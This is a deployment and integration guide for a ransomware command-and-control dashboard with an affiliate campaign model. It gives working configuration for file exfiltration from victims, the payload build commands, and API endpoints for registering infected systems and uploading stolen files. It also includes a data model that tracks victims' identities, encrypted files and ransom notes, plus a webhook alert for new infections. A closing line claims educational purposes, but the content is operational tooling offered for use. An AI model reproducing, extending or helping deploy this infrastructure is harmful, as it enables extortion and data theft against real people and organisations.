# Integration Guide - Chaos C2 Dashboard

## Quick Deploy

```bash
cd vercel-dashboard

# 1. Install Vercel CLI
npm i -g vercel

# 2. Login
vercel login

# 3. Create KV Database
# Vercel Dashboard → Storage → Create Database → KV
# Copy KV_REST_API_URL and KV_REST_API_TOKEN

# 4. Set Environment Variables (Vercel Project Settings → Environment Variables)
MASTER_API_KEY=sk_admin_xxxxxxxxxxxx
KV_REST_API_URL=https://xxx.kv.vercel-storage.com
KV_REST_API_TOKEN=xxx

# 5. Optional: External Storage for Large Files (>100KB)
EXTERNAL_STORAGE_PROVIDER=r2
EXTERNAL_STORAGE_BUCKET=chaos-exfil
EXTERNAL_STORAGE_PUBLIC_URL=https://pub-xxx.r2.dev
R2_ACCOUNT_ID=xxx
R2_ACCESS_KEY_ID=xxx
R2_SECRET_ACCESS_KEY=xxx

# 6. Deploy
vercel --prod
```

## Payload Integration

### 1. Configure Exfiltration

Update `payload.config.json`:

```json
{
  "exfiltration": {
    "enabled": true,
    "serverUrl": "https://your-project.vercel.app",
    "apiKey": "ck_yourcampaignkey",
    "maxFileSizeMB": 50,
    "targetExtensions": [".txt", ".doc", ".pdf", ".sql", ".json", ".cs", ".py"],
    "skipExtensions": [".exe", ".dll", ".sys"],
    "maxFiles": 1000,
    "compress": true,
    "encrypt": true,
    "timeoutSeconds": 30,
    "retryCount": 3,
    "retryDelaySeconds": 5,
    "chunkSizeKB": 90,
    "enableDeduplication": true,
    "rateLimitBackoff": true
  }
}
```

### 2. Use Enhanced Exfiltration Module

Replace the `Exfiltration` class in `PayloadSource_v2.cs` with `Exfiltration_FullIntegration.cs`.

Key improvements:
- **Automatic chunked upload** for files >90KB (server KV limit)
- **SHA256 deduplication** - server rejects duplicates
- **Rate limit handling** - respects `Retry-After` header, exponential backoff
- **Heartbeat throttling** - client-side 1/min + server-side 60/min enforcement
- **Optimistic locking** - registration handles concurrent payloads

### 3. Build Payload

```bash
# Generate RSA keys (dashboard now does this automatically on campaign creation)
# But for local testing:
dotnet run -- gen-keys -d ./keys -n mycampaign

# Build with dashboard config
dotnet run -- build -c payload.config.dashboard.json --keys-dir ./keys --key-name mycampaign
```

## Dashboard Usage

### Access
Visit `https://your-project.vercel.app/dashboard`

### Authentication
1. Click **Sign In** (top right)
2. Enter **Master API Key** (admin) OR **Campaign API Key** (affiliate)
3. Dashboard scopes to your campaign automatically

### Navigation

| View | Purpose |
|------|---------|
| **Overview** | Global stats, daily charts, recent infections, campaign performance |
| **Systems** | Full system table with search, filters, pagination, CSV export |
| **Campaigns** | Campaign cards with keys, stats, actions (admin only) |
| **Analytics** | 30-day trends, extensions, heatmap, campaign radar |
| **Geographic** | Country/city breakdown, ISP tracking |
| **Timeline** | Real-time event stream (SSE), time-series charts |
| **Files** | File explorer (filter by system/campaign), download via signed URLs |

### Campaign Management (Admin)
- **Create**: Click `+ New Campaign` → auto-generates RSA-4096 keypair
- **Edit**: Click `Details` → `Edit` on any campaign card
- **API Keys**: Copy (clipboard) or Regenerate (refresh)
- **Delete**: Removes campaign + all systems + all files (irreversible)

### System Actions
- **View Details**: Click any row → forensic modal with files
- **Delete**: Admin only (trash icon)
- **Export CSV**: All filtered systems → `systems_YYYY-MM-DD.csv`

## API Endpoints

### Payload-Facing (Require Campaign API Key)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/systems` | Register new infected system |
| PUT | `/api/systems` | Heartbeat / stats update |
| POST | `/api/exfil/upload` | Upload exfiltrated file (supports chunking) |
| GET | `/api/systems?id=` | Get system details (own campaign only) |

### Dashboard-Facing (Require Master API Key)

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/campaigns` | List all campaigns |
| POST | `/api/campaigns` | Create campaign (generates RSA keys) |
| PUT | `/api/campaigns` | Update campaign |
| DELETE | `/api/campaigns?id=` | Delete campaign |
| GET | `/api/stats?campaignId=&range=` | Campaign statistics |
| GET | `/api/stats?range=` | Global statistics |
| GET | `/api/realtime/events` | SSE real-time event stream |
| GET | `/api/realtime/events?since=` | Polling fallback |

### Event Types (SSE)

```
connected          - Connection established
heartbeat          - 30s keepalive
system:registered  - New infection
system:status      - Status change (active/idle/offline)
system:deleted     - System removed
file:uploaded      - File exfiltrated
campaign:created   - New campaign
campaign:updated   - Campaign modified
```

## Rate Limits (Per Campaign)

| Operation | Limit | Window |
|-----------|-------|--------|
| System Registration | 10 | 1 minute |
| Heartbeat | 60 | 1 minute |
| File Upload | 100 | 1 minute |
| Chunked Upload | 500 | 1 minute |

Headers returned:
- `X-RateLimit-Limit`
- `X-RateLimit-Remaining`
- `X-RateLimit-Reset`
- `Retry-After` (on 429)

## File Storage

| Size | Storage |
|------|---------|
| ≤ 100KB | Vercel KV (base64, 30-day TTL) |
| > 100KB | Chunked to KV (90KB/chunk) |
| > 100KB + External Config | R2 / S3 / Vercel Blob |

External files return `downloadUrl` in metadata for direct access.

## KV Data Model (Updated)

```
campaign:{id}                    → { id, name, apiKey, publicKeyPem, privateKeyPem, ... }
campaign:{id}:stats              → HASH { totalInfections, totalFiles, totalBytes, lastActivity }
campaign:{id}:systems            → SET of systemIds
campaign:{id}:daily:{YYYY-MM-DD} → HASH { infections, uploads, bytes }
campaign:{id}:exts               → HASH { ext: count }

system:{id}                      → { id, victimId, campaignId, hostname, username, os, ip, country, city, isp, status, firstSeen, lastSeen, version, tags }
system:{id}:stats                → HASH { filesEncrypted, filesExfiltrated, bytesExfiltrated, ransomNoteDropped }
system:{id}:files                → SET of fileIds
system:{id}:campaigns            → SET of campaignIds
system:{id}:lock                 → Temporary registration lock (TTL 10s)

file:{id}:meta                   → { id, systemId, campaignId, fileName, fileExt, size, uploadedAt, contentType, storage: {type, provider, key, url}, hash, chunked }
file:{id}:data                   → base64 content (KV, ≤100KB, TTL 30d)
file:{id}:chunk:{index}          → base64 chunk (KV, TTL 24h)

global:campaigns                 → SET of campaignIds
global:systems                   → SET of systemIds
global:files                     → SET of fileIds
global:stats                     → HASH { totalInfections, totalFiles, totalBytes }
global:daily:{YYYY-MM-DD}        → HASH { uploads, bytes }
global:exts                      → HASH { ext: count }
```

## Vercel Limits (Hobby Plan)

| Resource | Limit | Notes |
|----------|-------|-------|
| KV Storage | 256 MB | ~2M small records |
| KV Reads/Day | 100,000 | Dashboard polls + SSE |
| KV Writes/Day | 10,000 | Registrations + heartbeats + uploads |
| Function Duration | 30s | Configured in vercel.json |
| Bandwidth | 100 GB/mo | File exfiltration counts |

**For production**: Upgrade to Pro for 1GB KV, 1M reads, 100K writes, 60s functions.

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "KV not configured" | Add `KV_REST_API_URL` + `KV_REST_API_TOKEN` to Vercel env vars |
| SSE disconnects | Check function timeout (30s), verify Vercel plan |
| Systems not appearing | Verify payload `serverUrl` + `/api/systems` POST, check API key |
| Charts empty | Wait for SSE data or click Refresh, check browser console |
| Auth fails | Verify API key matches campaign `apiKey` field |
| Large files missing | Enable external storage (R2/S3/Blob) or check chunked upload |
| 429 Rate Limited | Payload handles backoff automatically; check campaign limits |
| Duplicate systems | Registration uses optimistic locking; safe to retry |

## Security Considerations

- **Payload endpoints require valid campaign API key**
- **Admin endpoints require master key**
- **CORS enabled** for payload uploads from any origin
- **Rate limiting** prevents abuse and quota exhaustion
- **Vercel KV encrypted at rest** (managed by Vercel)
- **Consider**: IP allowlisting, audit logging, WAF rules

## Customization

### Add Discord/Slack Alerts

```javascript
// In api/systems/index.js POST handler, after new system:
await fetch('https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    content: `🦠 **New Infection**\nSystem: ${system.hostname}\nCampaign: ${campaign.name}\nLocation: ${city}, ${country}`
  })
});
```

### Custom Chart Types

```javascript
// In dashboard/app.js:
new Chart(ctx, {
  type: 'scatter',
  data: { datasets: [{ label: 'Files', data: files.map(f => ({ x: f.uploadedAt, y: f.size })) }] },
  options: { scales: { x: { type: 'time' }, y: { type: 'logarithmic' } } }
});
```

## License

Educational/Research purposes only. Unauthorized deployment against systems you don't own is illegal.